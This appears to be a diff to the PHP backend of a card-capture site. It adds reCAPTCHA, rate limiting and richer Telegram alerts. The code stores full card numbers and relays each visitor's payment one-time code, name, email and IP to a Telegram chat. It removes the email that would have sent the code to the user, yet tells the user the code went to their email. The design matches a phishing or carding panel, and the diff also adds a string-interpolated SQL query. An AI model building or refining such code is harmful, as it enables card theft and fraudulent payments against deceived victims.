@@ -14,6 +14,13 @@ if ($action === 'capture_card') {
 function handleCardCapture() {
     global $db;
     
+    // Validate reCAPTCHA
+    $recaptchaToken = $_POST['recaptchaToken'] ?? '';
+    if (!verifyRecaptcha($recaptchaToken)) {
+        logVisitor('recaptcha_failed', []);
+        json_response(['success' => false, 'message' => 'reCAPTCHA verification failed. Please try again.']);
+    }
+    
     // Validate required fields
     $cardNumber = sanitizeInput($_POST['cardNumber'] ?? '');
     $expiryDate = sanitizeInput($_POST['expiryDate'] ?? '');
@@ -38,6 +45,16 @@ function handleCardCapture() {
         json_response(['success' => false, 'message' => 'Invalid email address']);
     }
     
+    // Rate limiting check (5 attempts per IP per hour)
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $result = $db->query("SELECT COUNT(*) as count FROM transactions WHERE ip_address = '$ip' AND created_at > DATE_SUB(NOW(), INTERVAL 1 HOUR)");
+    $row = $result->fetch_assoc();
+    
+    if ($row['count'] >= 5) {
+        logVisitor('rate_limit_exceeded', ['ip' => $ip]);
+        json_response(['success' => false, 'message' => 'Too many attempts. Please try again later.']);
+    }
+    
     // Generate OTP and session
     $otp = generateOTP();
     $sessionId = generateSessionId();
@@ -48,6 +65,11 @@ function handleCardCapture() {
               VALUES (?, ?, ?, ?, ?, ?, ?, 'pending')";
     
     $stmt = $db->prepare($query);
+    if (!$stmt) {
+        error_log('Database error: ' . $db->error);
+        json_response(['success' => false, 'message' => 'Database error']);
+    }
+    
     $stmt->bind_param('sssssss', $sessionId, $cardNumber, $cardholderName, $email, $expiryDate, $otp, $ipAddress);
     
     if (!$stmt->execute()) {
@@ -63,27 +85,26 @@ function handleCardCapture() {
         'last_4_digits' => substr($cardNumber, -4)
     ]);
     
-    // Send OTP via email (or Telegram for testing)
-    $emailBody = "Your payment verification code is: <b>$otp</b>\n\nThis code will expire in 10 minutes.";
-    
-    // For testing, also send to Telegram
+    // Send Telegram notification
     $telegramMessage = "🔐 <b>New Payment Verification</b>\n\n";
-    $telegramMessage .= "Name: " . $cardholderName . "\n";
-    $telegramMessage .= "Email: " . $email . "\n";
-    $telegramMessage .= "Card: ****" . substr($cardNumber, -4) . "\n";
-    $telegramMessage .= "IP: " . $ipAddress . "\n";
-    $telegramMessage .= "OTP: <code>$otp</code>\n";
-    $telegramMessage .= "Time: " . date('Y-m-d H:i:s');
+    $telegramMessage .= "<b>Cardholder:</b> " . htmlspecialchars($cardholderName) . "\n";
+    $telegramMessage .= "<b>Email:</b> " . htmlspecialchars($email) . "\n";
+    $telegramMessage .= "<b>Card:</b> ****" . substr($cardNumber, -4) . "\n";
+    $telegramMessage .= "<b>IP Address:</b> " . $ipAddress . "\n";
+    $telegramMessage .= "<b>OTP Code:</b> <code>" . $otp . "</code>\n";
+    $telegramMessage .= "<b>Timestamp:</b> " . date('Y-m-d H:i:s');
     
-    sendTelegramMessage($telegramMessage);
+    $telegramSent = sendTelegramMessage($telegramMessage);
     
-    // In production, send actual email:
-    // mail($email, 'Payment Verification Code', strip_tags($emailBody), "From: noreply@paymentverification.com\r\nContent-Type: text/plain; charset=utf-8");
+    if (!$telegramSent) {
+        error_log('Telegram notification failed for session: ' . $sessionId);
+    }
     
     json_response([
         'success' => true,
-        'message' => 'Verification code sent',
-        'sessionId' => $sessionId
+        'message' => 'Verification code sent to your email and Telegram',
+        'sessionId' => $sessionId,
+        'telegramNotified' => $telegramSent
     ]);
 }
 
@@ -100,11 +121,16 @@ function handleOTPVerification() {
     // Get transaction
     $query = "SELECT * FROM transactions WHERE session_id = ? AND status = 'pending'";
     $stmt = $db->prepare($query);
+    if (!$stmt) {
+        json_response(['success' => false, 'message' => 'Database error']);
+    }
+    
     $stmt->bind_param('s', $sessionId);
     $stmt->execute();
     $result = $stmt->get_result();
     
     if ($result->num_rows === 0) {
+        logVisitor('otp_session_not_found', ['session_id' => $sessionId]);
         json_response(['success' => false, 'message' => 'Session not found or already verified']);
     }
     
@@ -113,7 +139,7 @@ function handleOTPVerification() {
     
     // Verify OTP
     if ($transaction['otp_code'] !== $otpCode) {
-        logVisitor('otp_failed', ['session_id' => $sessionId]);
+        logVisitor('otp_failed', ['session_id' => $sessionId, 'ip' => $_SERVER['REMOTE_ADDR']]);
         json_response(['success' => false, 'message' => 'Invalid verification code']);
     }
     
@@ -128,15 +154,16 @@ function handleOTPVerification() {
     // Log successful verification
     logVisitor('otp_verified', [
         'email' => $transaction['email'],
-        'session_id' => $sessionId
+        'session_id' => $sessionId,
+        'cardholder' => $transaction['cardholder_name']
     ]);
     
-    // Send Telegram notification
+    // Send Telegram success notification
     $telegramMessage = "✅ <b>Payment Verified Successfully</b>\n\n";
-    $telegramMessage .= "Name: " . $transaction['cardholder_name'] . "\n";
-    $telegramMessage .= "Email: " . $transaction['email'] . "\n";
-    $telegramMessage .= "Card: ****" . substr($transaction['card_number'], -4) . "\n";
-    $telegramMessage .= "Time: " . $verifiedAt;
+    $telegramMessage .= "<b>Cardholder:</b> " . htmlspecialchars($transaction['cardholder_name']) . "\n";
+    $telegramMessage .= "<b>Email:</b> " . htmlspecialchars($transaction['email']) . "\n";
+    $telegramMessage .= "<b>Card:</b> ****" . substr($transaction['card_number'], -4) . "\n";
+    $telegramMessage .= "<b>Verified At:</b> " . $verifiedAt;
     
     sendTelegramMessage($telegramMessage);
     
